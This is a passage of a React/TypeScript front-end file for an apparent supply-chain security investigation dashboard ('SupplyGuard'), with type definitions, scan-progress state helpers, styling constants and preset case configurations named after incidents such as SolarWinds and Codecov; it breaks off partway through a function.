import { Fragment, useCallback, useEffect, useLayoutEffect, useMemo, useState } from 'react'
import { useRef } from 'react'
import {
  Area,
  AreaChart,
  Bar,
  BarChart,
  CartesianGrid,
  ResponsiveContainer,
  Tooltip,
  XAxis,
  YAxis,
} from 'recharts'
import type { ChangeEvent, ReactNode } from 'react'
import {
  motion,
  useMotionValue,
  useMotionValueEvent,
  useReducedMotion,
  useSpring,
  useTransform,
} from 'motion/react'
import {
  Background,
  Controls,
  MarkerType,
  MiniMap,
  ReactFlow,
  type Edge,
  type Node,
  type ReactFlowInstance,
} from '@xyflow/react'
import {
  AlertTriangle,
  Archive,
  ArrowUp,
  Bot,
  Boxes,
  BrainCircuit,
  ChevronDown,
  ChevronRight,
  ChevronUp,
  CheckCircle2,
  ClipboardCheck,
  ClipboardList,
  Code2,
  Copy,
  Download,
  EyeOff,
  FileSearch,
  FileText,
  Fingerprint,
  FolderOpen,
  Images,
  GitBranch,
  GitPullRequestArrow,
  KeyRound,
  Loader2,
  MessageCircle,
  MoreHorizontal,
  Music2,
  Network,
  PackageCheck,
  PanelLeftClose,
  PanelLeftOpen,
  Pencil,
  Plus,
  Radar,
  RefreshCw,
  Route,
  Search,
  ServerCog,
  ShieldAlert,
  ShieldCheck,
  Siren,
  Sparkles,
  TerminalSquare,
  TrendingUp,
  Trash2,
  Upload,
  User,
  Video,
  X,
  type LucideIcon,
} from 'lucide-react'
import { toast } from 'sonner'
import {
  AGENT_FOCUS_LABELS,
  agentAnswerFocus as agentAnswerFocusFromQuestion,
  agentEvidenceChainLines,
  agentTextMatchesFocus,
  sanitizeAgentAnswerMarkdown,
  type AgentAnswerFocus,
  type FocusedAgentModule,
} from './agent-answer-formatting'
import {
  analyzeMultimodalRecognizedText,
  askSecurityAgentChat,
  askSecurityAssistant,
  createCICDAuditBaseline,
  createCodeAuditBaseline,
  createRealtimeLogBaseline,
  ignoreCICDAuditFinding,
  ignoreCodeAuditFinding,
  ignoreRealtimeLogFinding,
  createSecurityAgentJob,
  downloadAgentEvidencePackage,
  downloadWorkspaceEvidencePackage,
  loadLatestSecurityAgentJob,
  loadSecurityAgentJob,
  loadCICDAuditSarif,
  loadDependencyAuditSbom,
  loadDependencyAuditVex,
  loadArtifactTrustReport,
  loadCodeAuditSarif,
  loadGitHubCodeScanningUploadStatus,
  loadMultimodalEvidenceLatest,
  loadRealtimeLogEvents,
  loadRealtimeLogTrend,
  createSecurityWorkspace,
  loadSecurityWorkspace,
  loadSecurityWorkspaceById,
  runWorkspaceScanSuite,
  runCICDAuditScan,
  runArtifactTrustScan,
  runDependencyAuditScan,
  runCodeAuditScan,
  runLogAuditScan,
  runMultimodalEvidenceScan,
  uploadAgentAttachments,
  uploadArtifactTrustScan,
  type ArtifactTrustCheck,
  type ArtifactTrustFinding,
  type ArtifactTrustResult,
  type AgentEvidenceGap,
  type AgentAttachment,
  type AgentNextAction,
  type AgentRunEvent,
  type AgentRunRequest,
  type AgentRunResult,
  type AgentRunStep,
  uploadCodeAuditToGitHubCodeScanning,
  uploadCICDAuditToGitHubCodeScanning,
  type CodeAuditResult,
  type CodeAuditFinding,
  type CodeAuditScanner,
  type CodeAuditState,
  type CICDAuditResult,
  type DependencyAuditResult,
  type GitHubCodeScanningUploadResult,
  type LogAuditResult,
  type LogAuditSource,
  type MultimodalAuditResult,
  type MultimodalEntity,
  type MultimodalEvidence,
  type MultimodalFinding,
  type MultimodalSourceType,
  type RealtimeLogPayload,
  type RealtimeLogTrendPoint,
  type SecurityAssistantPayload,
  type SecurityAssistantResponse,
  type SecurityDependency,
  type SecurityFinding,
  type SecurityGraphRagResult,
  type SecurityLogEvent,
  type SecurityPipelineStep,
  type SecuritySeverity,
  type SecurityWorkspace,
  type VexStatus,
} from '@/lib/security-api'
import {
  createConversation,
  deleteConversation,
  listConversations,
  renameConversation,
  type SecurityConversation,
} from '@/lib/conversation-api'
import {
  importGitProject,
  importLocalProject,
  uploadProjectArchive,
  uploadProjectFiles,
  type ProjectImportRecord,
} from '@/lib/import-api'
import {
  demoPresets,
  type DemoPresetKey,
} from '@/features/project-import/demo-presets'
import { useAuthStore } from '@/stores/auth-store'
import { Logo } from '@/assets/logo'
import { IconGithub } from '@/assets/brand-icons'
import { cn, formatLocalDateTime } from '@/lib/utils'
import { decideAgentQuestionAction } from './agent-question-routing'
import { gnnScoreLabel, isGnnJudged, resolveGnnDecisionStatus } from './gnn-display-model'
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import {
  Card,
  CardContent,
  CardHeader,
  CardTitle,
} from '@/components/ui/card'
import {
  Collapsible,
  CollapsibleContent,
  CollapsibleTrigger,
} from '@/components/ui/collapsible'
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog'
import {
  Sheet,
  SheetContent,
  SheetDescription,
  SheetHeader,
  SheetTitle,
} from '@/components/ui/sheet'
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from '@/components/ui/dropdown-menu'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { ScrollArea } from '@/components/ui/scroll-area'
import { Separator } from '@/components/ui/separator'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select'
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table'
import { Switch } from '@/components/ui/switch'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Textarea } from '@/components/ui/textarea'
import {
  Tooltip as UiTooltip,
  TooltipContent as UiTooltipContent,
  TooltipTrigger as UiTooltipTrigger,
} from '@/components/ui/tooltip'
import { Header } from '@/components/layout/header'
import { Main } from '@/components/layout/main'
import { ThemeSwitch } from '@/components/theme-switch'
import {
  investigationSteps,
  isPlatformTab,
  normalizeWorkbenchHash,
  workspaceTabStepIds,
  workspaceTabTitles,
  type InvestigationStep,
  type InvestigationStepId,
  type PlatformTab,
} from './investigation-workflow'
import { MultimodalEvidencePanel } from './multimodal-evidence-panel'
import { AttackChainGraph } from './attack-chain-graph'
import { ReportPanel, normalizeReportForDisplay } from './report-panel'
import { workspaceHasScanResult } from './workspace-module-state'
import {
  buildCicdDisplayModel,
  type CicdDisplayModel,
} from './cicd-display-model'
import {
  SUPPLEMENT_PROJECT_ARCHIVE_ACCEPT,
  SUPPLEMENT_FILE_INPUT_TITLE,
  SUPPLEMENT_FILE_LABEL,
  artifactTrustGateButtonLabel,
  artifactTrustGateReadinessMessage,
  artifactTrustRequiredFilesReady,
  isSupplementProjectArchive,
  supplementFileSuccessMessage,
} from './supplement-file-workflow'
type KnowledgeGraphNode = NonNullable<
  NonNullable<SecurityWorkspace['graph']>['nodes']
>[number]
type KnowledgeGraphEdge = NonNullable<
  NonNullable<SecurityWorkspace['graph']>['edges']
>[number]
type KnowledgeGraphAttackPath = NonNullable<
  NonNullable<SecurityWorkspace['graph']>['attack_paths']
>[number]
type GraphDisplayMode = 'attack' | 'trust' | 'all'
type GraphWorkbenchView = 'map' | 'heatmap' | 'graph'
type AttackChainStageKind = 'external' | 'dependency' | 'build' | 'artifact' | 'runtime' | 'code' | 'asset' | 'other'
type AttackChainStage = {
  id: string
  index: number
  title: string
  subtitle: string
  source: string
  target: string
  relation: string
  model: string
  confidence: number
  evidenceCount: number
  description: string
  kind: AttackChainStageKind
  evidenceGroups: string[]
}
type ReachabilityVerdict = 'pending' | 'not_reachable' | 'suspected' | 'confirmed'
type ReachabilityNodeStatus = 'confirmed' | 'found' | 'pending' | 'risk' | 'missing'
type ReachabilityPathNode = {
  id: string
  title: string
  description: string
  status: ReachabilityNodeStatus
  evidence: string
  icon: ReactNode
}
type ReachabilityMatrixCell = {
  label: string
  status: 'hit' | 'gap' | 'risk' | 'na'
  detail: string
}
type ReachabilityMatrixRow = {
  id: string
  signal: string
  severity?: SecuritySeverity
  cells: ReachabilityMatrixCell[]
}
type ReachabilityViewModel = {
  verdict: ReachabilityVerdict
  verdictLabel: string
  verdictDescription: string
  targetDependency?: SecurityDependency
  targetName: string
  targetVersion: string
  targetRisk: number
  targetReason: string
  importHits: number
  entryHits: number
  executionHits: number
  runtimeHits: number
  graphHits: number
  gapCount: number
  gaps: string[]
  pathNodes: ReachabilityPathNode[]
  matrixRows: ReachabilityMatrixRow[]
  codeFindings: CodeAuditFinding[]
  logFindingCount: number
  hasDependencyAudit: boolean
  hasCodeAudit: boolean
}
type ReachabilityAnalysisItem = {
  id: string
  dependency: SecurityDependency
  name: string
  currentVersion: string
  requestedVersion: string
  packageManager: string
  sourceFiles: string[]
  severity: SecuritySeverity
  riskScore: number
  status: ReachabilityStatus
  evidence: {
    codeRefs: number
    entryHits: number
    runtimeEvidence: number
    externalAlerts: number
    attackChainLinks: number
  }
  missing: string[]
  advisories: string[]
  rawEvidence: string[]
}
type EvidenceRecommendationPriority = '高' | '中' | '低'
type ReachabilityStatus = 'reachable' | 'pending'
type EvidenceRecommendation = {
  id: string
  title: string
  priority: EvidenceRecommendationPriority
  where: string
  uploadTo: string
  proves: string
  examples: string[]
  keywords: string[]
  referenceModel: string
}
type MultimodalEntityRow = MultimodalEntity & {
  evidence_id: string
  source_name: string
  source_type: MultimodalSourceType
}
type MultimodalFindingRow = MultimodalFinding & {
  source_name: string
  source_type: MultimodalSourceType
}
type MultimodalEntityGroup = 'package' | 'ioc' | 'service' | 'behavior' | 'time' | 'other'
type MultimodalEntityRuleSummary = {
  key: string
  title: string
  ruleId: string
  severity: SecuritySeverity
  score: number
  count: number
  evidenceCount: number
  keywords: string[]
  entities: string[]
  sourceNames: string[]
  recommendation: string
}
type MultimodalEntitySummary = {
  key: string
  type: string
  value: string
  normalized: string
  count: number
  sourceCount: number
  confidence: number
  sourceNames: string[]
  evidenceIds: string[]
  examples: string[]
  group: MultimodalEntityGroup
  ruleCount: number
  maxRuleScore: number
  maxRuleSeverity: SecuritySeverity | null
  ruleSummaries: MultimodalEntityRuleSummary[]
}
type AgentTargetPreset = '3cx' | 'solarwinds' | 'codecov' | 'eventstream' | 'manual'
type AssistantMode = 'graphrag' | 'agent'
type AgentFormState = {
  question: string
  targetPath: string
  artifactPath: string
  attestationPath: string
  expectedRepo: string
  expectedCommit: string
  allowedWorkflows: string
  allowedBuilders: string
  logPaths: string
  requireSignature: boolean
  allowSelfHostedRunner: boolean
}
type AgentInvestigationStage = {
  id: 'dependency' | 'cicd' | 'artifact' | 'logs' | 'multimodal' | 'graph'
  title: string
  subtitle: string
  moduleTab: PlatformTab
  stepIds: string[]
  icon: ReactNode
  evidenceLabel: string
  successCriteria: string
}
type AgentCommandSummary = {
  riskScore: number
  attackPathCount: number
  evidenceGapCount: number
  confidence: number
  status: string
}
type WorkspaceTab = {
  id: PlatformTab | `dependency:${string}`
  module: PlatformTab
  title: string
  stepId: InvestigationStepId
  description?: string
  closable: boolean
  pinned?: boolean
}

type ScanStepStatus = 'pending' | 'running' | 'completed' | 'skipped' | 'failed'

type ScanStepState = {
  id: PlatformTab | 'preflight'
  label: string
  status: ScanStepStatus
  message: string
}

const scanStepSeed: ScanStepState[] = [
  { id: 'code', label: '代码审查', status: 'pending', message: '等待扫描' },
  { id: 'supply', label: '供应链', status: 'pending', message: '等待扫描' },
  { id: 'pipeline', label: 'CI/CD 链路', status: 'pending', message: '等待扫描' },
  { id: 'artifact', label: '产物可信', status: 'pending', message: '等待材料' },
  { id: 'logs', label: '日志印证', status: 'pending', message: '等待材料' },
  { id: 'multimodal', label: '多模态证据', status: 'pending', message: '等待材料' },
  { id: 'graph', label: '图谱与报告', status: 'pending', message: '等待汇总' },
]

type ScanWorkspaceState = {
  running: boolean
  completed: boolean
  steps: ScanStepState[]
}

function freshScanState(): ScanWorkspaceState {
  return {
    running: false,
    completed: false,
    steps: scanStepSeed.map((step) => ({ ...step })),
  }
}

function scanStateStorageKey(workspaceId: string) {
  return `supplyguard.scan-state.${workspaceId}`
}

function scanProgressPercent(steps: ScanStepState[], running = false) {
  const finished = steps.filter((step) =>
    ['completed', 'skipped', 'failed'].includes(step.status)
  ).length
  const runningWeight = running && steps.some((step) => step.status === 'running') ? 0.35 : 0
  return Math.min(100, Math.round(((finished + runningWeight) / Math.max(1, steps.length)) * 100))
}

const agentModuleIdByScanStep: Partial<Record<ScanStepState['id'], string>> = {
  code: 'code_audit',
  supply: 'dependency_audit',
  pipeline: 'cicd_audit',
  artifact: 'artifact_trust',
  logs: 'log_audit',
  multimodal: 'multimodal_audit',
  graph: 'workspace_report',
}

function scanStateFromWorkspace(workspace: SecurityWorkspace | null): ScanWorkspaceState {
  if (!workspace) return freshScanState()
  if (!isWorkspaceScanned(workspace)) return freshScanState()
  const errors = new Map(
    (workspace.scanSuite?.errors ?? []).map((item) => [item.module, item.message])
  )
  const completedModuleIds = new Set(workspace.scanSuite?.completed ?? [])
  const skippedModules = new Map(
    (workspace.scanSuite?.skipped ?? []).map((item) => [item.module, item.reason || '本轮未调用'])
  )
  const hasExplicitModuleResults = Array.isArray(workspace.scanSuite?.completed)
  const steps = scanStepSeed.map((step) => {
    const moduleKey = agentModuleIdByScanStep[step.id] || String(step.id)
    const error = errors.get(moduleKey) || errors.get(String(step.id))
    const hasSavedResult = workspaceHasScanResult(workspace, moduleKey)
    if (error) return { ...step, status: 'failed' as const, message: error }
    if (completedModuleIds.has(moduleKey)) {
      return { ...step, status: 'completed' as const, message: '本轮执行完成' }
    }
    if (hasSavedResult) {
      return { ...step, status: 'completed' as const, message: '已有扫描结果' }
    }
    if (hasExplicitModuleResults) {
      return {
        ...step,
        status: 'skipped' as const,
        message: skippedModules.get(moduleKey) || '本轮未调用',
      }
    }
    if (step.id === 'artifact') {
      return workspace.artifact_trust?.scan_id
        ? { ...step, status: 'completed' as const, message: '扫描完成' }
        : { ...step, status: 'skipped' as const, message: '缺少 artifact 与 provenance 材料' }
    }
    if (step.id === 'logs') {
      return workspace.log_audit?.scan_id
        ? { ...step, status: 'completed' as const, message: '扫描完成' }
        : { ...step, status: 'skipped' as const, message: '缺少运行期日志文件' }
    }
    if (step.id === 'multimodal') {
      return workspace.multimodal_audit?.summary?.evidence_count
        ? { ...step, status: 'completed' as const, message: '扫描完成' }
        : { ...step, status: 'skipped' as const, message: '未上传外部告警证据' }
    }
    if (step.id === 'graph') {
      return errors.size
        ? { ...step, status: 'failed' as const, message: '汇总时出现错误' }
        : { ...step, status: 'completed' as const, message: '图谱与报告已更新' }
    }
    return { ...step, status: 'skipped' as const, message: '尚无扫描结果' }
  })
  return { running: false, completed: true, steps }
}

function scanStateFromAgentRun(run: AgentRunResult, workspace?: SecurityWorkspace | null): ScanWorkspaceState {
  const agentStepById = new Map((run.steps || []).map((step) => [step.id, step]))
  const workspaceStepById = new Map(
    scanStateFromWorkspace(workspace ?? null).steps.map((step) => [step.id, step])
  )
  const statusByStep: Record<string, ScanStepStatus> = {
    pending: 'pending',
    running: 'running',
    success: 'completed',
    skipped: 'skipped',
    failed: 'failed',
  }
  const steps = scanStepSeed.map((seed) => {
    const savedStep = workspaceStepById.get(seed.id) ?? seed
    const agentStep = agentStepById.get(agentModuleIdByScanStep[seed.id] || '')
    if (!agentStep) return { ...savedStep }
    const status = statusByStep[agentStep.status] ?? 'pending'
    if (status === 'skipped' && savedStep.status === 'completed') {
      return { ...savedStep, message: '已有扫描结果，本轮未重复执行' }
    }
    const message = [
      agentStep.error,
      agentStep.summary?.message,
      agentStep.summary?.reason,
      agentStep.description,
    ].find((value): value is string => typeof value === 'string') ?? ''
    return {
      ...seed,
      status,
      message,
    }
  })
  const running = ['queued', 'running', 'idle'].includes(String(run.status))
  const completed = !running && Boolean(run.runId)
  return { running, completed, steps }
}

function readStoredScanState(workspaceId: string): ScanWorkspaceState | null {
  try {
    const raw = window.localStorage.getItem(scanStateStorageKey(workspaceId))
    if (!raw) return null
    const parsed = JSON.parse(raw) as ScanWorkspaceState
    if (!Array.isArray(parsed.steps)) return null
    return {
      running: Boolean(parsed.running),
      completed: Boolean(parsed.completed),
      steps: scanStepSeed.map((seed) => parsed.steps.find((step) => step.id === seed.id) ?? seed),
    }
  } catch {
    return null
  }
}

function writeStoredScanState(workspaceId: string, state: ScanWorkspaceState) {
  window.localStorage.setItem(scanStateStorageKey(workspaceId), JSON.stringify(state))
}

const assistantHistoryLimit = 50

function assistantHistoryStorageKey(workspaceId: string) {
  return `supplyguard.assistant-history.${workspaceId}`
}

function normalizeAssistantHistory(value: unknown): SecurityAssistantResponse[] {
  if (!Array.isArray(value)) return []
  return value
    .filter((item): item is SecurityAssistantResponse =>
      Boolean(
        item &&
          typeof item === 'object' &&
          'question' in item &&
          'answer' in item &&
          typeof (item as SecurityAssistantResponse).question === 'string' &&
          typeof (item as SecurityAssistantResponse).answer === 'string'
      )
    )
    .map((item) => ({
      question: item.question,
      answer: item.answer,
      retrieval: Array.isArray(item.retrieval) ? item.retrieval : [],
      graph_rag: item.graph_rag ?? null,
      next_actions: Array.isArray(item.next_actions) ? item.next_actions : [],
      model: item.model || 'demo-rag-security-analyst',
    }))
    .slice(-assistantHistoryLimit)
}

function readStoredAssistantHistory(workspaceId: string): SecurityAssistantResponse[] {
  try {
    const raw = window.localStorage.getItem(assistantHistoryStorageKey(workspaceId))
    if (!raw) return []
    return normalizeAssistantHistory(JSON.parse(raw))
  } catch {
    return []
  }
}

function writeStoredAssistantHistory(workspaceId: string, messages: SecurityAssistantResponse[]) {
  window.localStorage.setItem(
    assistantHistoryStorageKey(workspaceId),
    JSON.stringify(messages.slice(-assistantHistoryLimit))
  )
}

function useAutoResizeTextarea({
  minHeight,
  maxHeight,
}: {
  minHeight: number
  maxHeight?: number
}) {
  const textareaRef = useRef<HTMLTextAreaElement>(null)

  const adjustHeight = useCallback(
    (reset = false) => {
      const textarea = textareaRef.current
      if (!textarea) return
      if (reset) {
        textarea.style.height = `${minHeight}px`
        return
      }
      textarea.style.height = `${minHeight}px`
      const nextHeight = Math.max(
        minHeight,
        Math.min(textarea.scrollHeight, maxHeight ?? Number.POSITIVE_INFINITY)
      )
      textarea.style.height = `${nextHeight}px`
    },
    [maxHeight, minHeight]
  )

  useEffect(() => {
    adjustHeight(true)
  }, [adjustHeight])

  useEffect(() => {
    const onResize = () => adjustHeight()
    window.addEventListener('resize', onResize)
    return () => window.removeEventListener('resize', onResize)
  }, [adjustHeight])

  return { textareaRef, adjustHeight }
}

const severityLabels: Record<SecuritySeverity, string> = {
  critical: '严重',
  high: '高危',
  medium: '中危',
  low: '低危',
}

const severityClasses: Record<SecuritySeverity, string> = {
  critical:
    'border-red-200 bg-red-50 text-red-700 dark:border-red-900 dark:bg-red-950/45 dark:text-red-300',
  high: 'border-orange-200 bg-orange-50 text-orange-700 dark:border-orange-900 dark:bg-orange-950/45 dark:text-orange-300',
  medium:
    'border-amber-200 bg-amber-50 text-amber-700 dark:border-amber-900 dark:bg-amber-950/45 dark:text-amber-300',
  low: 'border-emerald-200 bg-emerald-50 text-emerald-700 dark:border-emerald-900 dark:bg-emerald-950/45 dark:text-emerald-300',
}

const statusClasses: Record<string, string> = {
  critical:
    'border-red-200 bg-red-50 text-red-700 dark:border-red-900 dark:bg-red-950/45 dark:text-red-300',
  high: 'border-orange-200 bg-orange-50 text-orange-700 dark:border-orange-900 dark:bg-orange-950/45 dark:text-orange-300',
  medium:
    'border-amber-200 bg-amber-50 text-amber-700 dark:border-amber-900 dark:bg-amber-950/45 dark:text-amber-300',
  active:
    'border-cyan-200 bg-cyan-50 text-cyan-700 dark:border-cyan-900 dark:bg-cyan-950/45 dark:text-cyan-300',
  observed:
    'border-slate-200 bg-slate-50 text-slate-700 dark:border-slate-800 dark:bg-slate-900 dark:text-muted-foreground',
}

const graphPositions: Record<string, { x: number; y: number }> = {
  repo: { x: 0, y: 120 },
  commit: { x: 230, y: 120 },
  package: { x: 460, y: 20 },
  script: { x: 690, y: 20 },
  build: { x: 920, y: 120 },
  artifact: { x: 690, y: 230 },
  service: { x: 460, y: 330 },
  log: { x: 230, y: 330 },
  apt: { x: 0, y: 330 },
}

const graphNodeTypeOrder = [
  'CodeFile',
  'DependencyPackage',
  'Vulnerability',
  'CIStep',
  'BuildArtifact',
  'SourceCommit',
  'Workflow',
  'TrustedBuilder',
  'Attestation',
  'RuntimeService',
  'LogEvent',
  'AudioEvidence',
  'VisualEvidence',
  'MultimodalEvidence',
  'MultimodalFinding',
  'RecognizedEntity',
  'Finding',
  'AttackStage',
  'EvidenceChain',
  'Asset',
]

const fallbackQuestion = '这条供应链攻击链路应该优先修哪里？'
const fallbackAssistant: SecurityAssistantPayload = {
  default_question: fallbackQuestion,
  answer: '当前还没有生成安全助手研判，请先完成扫描或刷新安全态势。',
  retrieval: [],
  next_actions: ['先确认供应链风险发现、CI/CD 构建链、产物可信和日志印证数据是否已生成。'],
}

const actionButtonClass =
  'border-primary/70 bg-primary text-primary-foreground shadow-sm transition-[border-color,background-color,box-shadow,transform] duration-300 hover:-translate-y-0.5 hover:border-ring hover:bg-primary/90 hover:text-primary-foreground hover:shadow-[var(--shadow-interactive)] active:translate-y-0 active:scale-[0.98] disabled:translate-y-0 disabled:bg-muted disabled:text-muted-foreground disabled:shadow-none'
const fileInputClass =
  'h-11 cursor-pointer bg-[color:var(--surface-inset)] text-sm file:mr-4 file:h-8 file:cursor-pointer file:rounded-md file:border file:border-primary/60 file:bg-primary file:px-4 file:text-sm file:font-semibold file:text-primary-foreground file:shadow-sm file:transition-colors hover:file:bg-primary/90'
const moduleSplitGridClass =
  'grid min-h-0 gap-5 xl:h-[calc(100vh-8.5rem)] xl:grid-cols-[minmax(0,1fr)_420px] xl:items-stretch xl:overflow-hidden'
const moduleMainColumnClass =
  'min-h-0 min-w-0 space-y-5 xl:overflow-y-auto xl:overscroll-contain xl:pr-1 xl:[scrollbar-gutter:stable] xl:[scrollbar-width:thin]'
const moduleSidebarColumnClass =
  'min-h-0 min-w-0 space-y-5 xl:overflow-y-auto xl:overscroll-contain xl:pr-1 xl:[scrollbar-gutter:stable] xl:[scrollbar-width:thin]'
const moduleCardClass =
  'surface-raised rounded-md transition-[border-color,background-color,box-shadow,transform] duration-300 hover:-translate-y-1 hover:border-ring/45 hover:shadow-[var(--shadow-interactive)] active:translate-y-0'
const moduleTabContentClass =
  'm-0 space-y-4 motion-safe:animate-in motion-safe:fade-in motion-safe:slide-in-from-bottom-3 motion-safe:zoom-in-95 motion-safe:duration-300'

const workbenchMotionEase: [number, number, number, number] = [0.16, 1, 0.3, 1]

function WorkbenchMotionLayer({
  motionKey,
  className,
  children,
}: {
  motionKey: string
  className?: string
  children: ReactNode
}) {
  const reducedMotion = useReducedMotion()

  if (reducedMotion) {
    return <div className={className}>{children}</div>
  }

  return (
    <motion.div
      key={motionKey}
      className={className}
      initial={{ opacity: 0, y: 22, scale: 0.975, filter: 'blur(10px)' }}
      animate={{ opacity: 1, y: 0, scale: 1, filter: 'blur(0px)' }}
      transition={{ duration: 0.46, ease: workbenchMotionEase }}
    >
      {children}
    </motion.div>
  )
}

const agentPresetRequests: Record<Exclude<AgentTargetPreset, 'manual'>, AgentRunRequest> = {
  '3cx': {
    targetPath: 'cases/3cx-supply-chain/sample-repo',
    artifactPath: 'cases/3cx-supply-chain/artifacts/3cx-desktop-app.tar.gz',
    attestationPath: 'cases/3cx-supply-chain/artifacts/3cx-desktop-app.intoto.jsonl',
    expectedRepo: 'https://github.com/3cx/desktop-app',
    expectedCommit: '8f42c19',
    allowedWorkflows: ['.github/workflows/desktop-release.yml'],
    allowedBuilders: ['https://github.com/actions/runner/self-hosted'],
    allowSelfHostedRunner: false,
    requireSignature: true,
    logPaths: [
      'cases/3cx-supply-chain/logs/build-runner.jsonl',
      'cases/3cx-supply-chain/logs/customer-endpoint.jsonl',
    ],
    timeoutSeconds: 180,
  },
  solarwinds: {
    targetPath: 'cases/solarwinds-sunburst/sample-repo',
    artifactPath: 'cases/solarwinds-sunburst/artifacts/orion-update.tar.gz',
    attestationPath: 'cases/solarwinds-sunburst/artifacts/orion-update.intoto.jsonl',
    expectedRepo: 'https://github.com/solarwinds/orion-platform',
    expectedCommit: '8f42c19',
    allowedWorkflows: ['.github/workflows/orion-release.yml'],
    allowedBuilders: ['https://github.com/actions/runner/self-hosted'],
    allowSelfHostedRunner: false,
    requireSignature: true,
    logPaths: [
      'cases/solarwinds-sunburst/logs/orion-build-runner.log',
      'cases/solarwinds-sunburst/logs/orion-runtime.jsonl',
    ],
    timeoutSeconds: 180,
  },
  codecov: {
    targetPath: 'cases/codecov-bash-uploader/sample-repo',
    artifactPath: 'cases/codecov-bash-uploader/artifacts/coverage-report.tar.gz',
    attestationPath: 'cases/codecov-bash-uploader/artifacts/coverage-report.intoto.jsonl',
    expectedRepo: 'https://github.com/codecov/example-service',
    expectedCommit: '8f42c19',
    allowedWorkflows: ['.github/workflows/coverage.yml'],
    allowedBuilders: ['https://github.com/actions/runner'],
    allowSelfHostedRunner: false,
    requireSignature: true,
    logPaths: [
      'cases/codecov-bash-uploader/logs/ci-build.jsonl',
      'cases/codecov-bash-uploader/logs/security-response.log',
    ],
    timeoutSeconds: 180,
  },
  eventstream: {
    targetPath: 'cases/event-stream-flatmap/sample-repo',
    artifactPath: 'cases/event-stream-flatmap/artifacts/wallet-web-bundle.tar.gz',
    attestationPath: 'cases/event-stream-flatmap/artifacts/wallet-web-bundle.intoto.jsonl',
    expectedRepo: 'https://github.com/example/wallet-web',
    expectedCommit: '8f42c19',
    allowedWorkflows: ['.github/workflows/wallet-release.yml'],
    allowedBuilders: ['https://github.com/actions/runner'],
    allowSelfHostedRunner: false,
    requireSignature: true,
    logPaths: [
      'cases/event-stream-flatmap/logs/build-runner.log',
      'cases/event-stream-flatmap/logs/wallet-runtime.jsonl',
    ],
    timeoutSeconds: 180,
  },
}

const emptyAgentForm: AgentFormState = {
  question: '',
  targetPath: '',
  artifactPath: '',
  attestationPath: '',
  expectedRepo: '',
  expectedCommit: '',
  allowedWorkflows: '',
  allowedBuilders: '',
  logPaths: '',
  requireSignature: true,
  allowSelfHostedRunner: false,
}

function agentTargetPresetLabel(preset: AgentTargetPreset) {
  const labels: Record<AgentTargetPreset, string> = {
    '3cx': '3CX / X_TRADER 案例',
    solarwinds: 'SolarWinds / SUNBURST 案例',
    codecov: 'Codecov Bash Uploader 案例',
    eventstream: 'event-stream / flatmap-stream 案例',
    manual: '手动项目',
  }
  return labels[preset]
}

function getWorkspaceDisplayName(workspace: Pick<SecurityWorkspace, 'workspace' | 'import'>) {
  return workspace.workspace?.name || workspace.import?.projectName || '当前项目'
}

function getWaitingAssistantPayload(
  workspace: Pick<SecurityWorkspace, 'workspace' | 'import'>,
  question?: string
): SecurityAssistantPayload {
  const projectName = getWorkspaceDisplayName(workspace)
  const targetQuestion = question?.trim()
  return {
    default_question: `${projectName} 这条供应链风险链路应该优先修哪里？`,
    answer: targetQuestion
      ? `${projectName} 目前还没有完成扫描，不能判断“${targetQuestion}”对应的修复优先级。请先点击“运行扫描”，或补充依赖、CI/CD、产物、日志和外部告警证据。`
      : `${projectName} 已导入，但尚未执行供应链溯源扫描。当前没有足够证据给出修复优先级，请先运行扫描或补充依赖、CI/CD、产物和日志材料。`,
    retrieval: [`Project: ${projectName}`, 'Status: waiting_for_scan'],
    graph_rag: null,
    next_actions: [
      '先运行供应链溯源扫描，生成依赖、代码和 CI/CD 证据。',
      '如需验证运行期影响，再上传日志或外部告警证据。',
    ],
  }
}

function isImportedSecurityWorkspace(workspace: Pick<SecurityWorkspace, 'workspace' | 'import'>) {
  return Boolean(workspace.import || workspace.workspace?.importId)
}

function assistantModeLabel(mode: AssistantMode) {
  return mode === 'agent' ? 'Agent' : 'GraphRAG'
}

function assistantMessageTitle(message: SecurityAssistantResponse) {
  if (message.model === 'agent-orchestrator') return 'SupplyGuard Agent'
  if (message.model === 'agent-graphrag') return 'SupplyGuard Agent · GraphRAG'
  if (message.model.includes('investigation-agent')) return 'SupplyGuard Agent'
  if (message.model === 'waiting-for-scan') return '等待扫描'
  return 'SupplyGuard GraphRAG'
}

function agentRequestFromWorkspace(workspace: SecurityWorkspace): AgentRunRequest {
  const workspaceId = getWorkspaceId(workspace)
  const importId = workspace.import?.importId || workspace.workspace?.importId
  const targetPath = workspace.import?.sourcePath || workspace.workspace?.repository
  return {
    workspaceId,
    ...(importId ? { importId } : {}),
    ...(targetPath ? { targetPath } : {}),
    includeCodeAudit: true,
    includeDependencyAudit: true,
    includeCicdAudit: true,
    includeArtifactTrust: true,
    includeLogAudit: true,
    timeoutSeconds: 240,
  }
}

function isDefenseBriefAction(action: AgentNextAction) {
  const text = `${action.actionKind || ''} ${action.title || ''} ${action.action || ''}`.toLowerCase()
  return action.actionKind === 'generate_defense_brief'
    || text.includes('答辩讲解')
    || text.includes('defense brief')
}

function visibleAgentNextActions(actions?: AgentNextAction[]) {
  return (actions || []).filter((action) => !isDefenseBriefAction(action))
}

function agentAnswerFocus(question: string, run?: AgentRunResult): AgentAnswerFocus {
  const selectedModules = (run?.plan?.selectedModules || [])
    .map((item) => item.id)
  return agentAnswerFocusFromQuestion(question, selectedModules)
}

function filterAgentLinesByFocus(lines: string[] | undefined, focus: AgentAnswerFocus) {
  const values = lines || []
  if (focus === 'global') return values
  return values.filter((line) => agentTextMatchesFocus(line, focus))
}

function focusedAgentSummary(
  focus: FocusedAgentModule,
  verdict: NonNullable<AgentRunResult['verdict']>,
  supportedClaims: string[],
  unsupportedClaims: string[],
  evidenceGaps: string[],
) {
